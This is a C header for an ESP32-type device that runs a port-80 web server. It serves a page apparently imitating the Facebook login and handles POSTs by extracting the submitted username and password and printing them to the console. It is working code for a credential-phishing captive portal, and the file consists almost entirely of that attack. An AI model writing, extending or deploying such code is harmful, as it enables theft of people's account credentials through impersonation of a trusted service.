#ifndef FACEBOOK_WEB_SERVER_H
#define FACEBOOK_WEB_SERVER_H

void handle_facebook_connection(http_request_t* req, int client_sock) {
    if(strcmp(req->method, "GET") == 0){
        ESP_LOGI("FacebookWebServer", "Handling GET request");
        http_send_html_response(client_sock, facebook_page_html);
    }
    else if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("FacebookWebServer", "Handling POST request");
        printf("BODY: %s\n", req->body);
        char username[128];
        char password[128];
        int ret = extract_form_field_to_buffer(req->body, "username", username, 128);
        if (ret != 0) {
            ESP_LOGE("FacebookWebServer", "Failed to extract username");
            http_send_error_response(client_sock);
            return;
        }
        ret = extract_form_field_to_buffer(req->body, "password", password, 128);
        if (ret != 0) {
            ESP_LOGE("FacebookWebServer", "Failed to extract password");
            http_send_error_response(client_sock);
            return;
        }
        printf("Username: %s\n", username);
        printf("Password: %s\n", password);

        http_send_ok_response(client_sock);
    } else {
        ESP_LOGI("FacebookWebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
}

void serve_facebook_page(){
    ESP_LOGI("FacebookWebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("FacebookWebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 80, INADDR_ANY) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("FacebookWebServer", "Web server started on port 80");

    while (1) {
        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("FacebookWebServer", "Connection accepted...");

        char buffer[1024];
        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
        if (len < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        
        http_request_t req = http_request_parse(buffer);
        printf("Facebook Request Method: %s\n", req.method);
        printf("Facebook Request URL: %s\n", req.url);

        handle_facebook_connection(&req, client_sock);

        close(client_sock);
    }
}


#endif // FACEBOOK_WEB_SERVER_H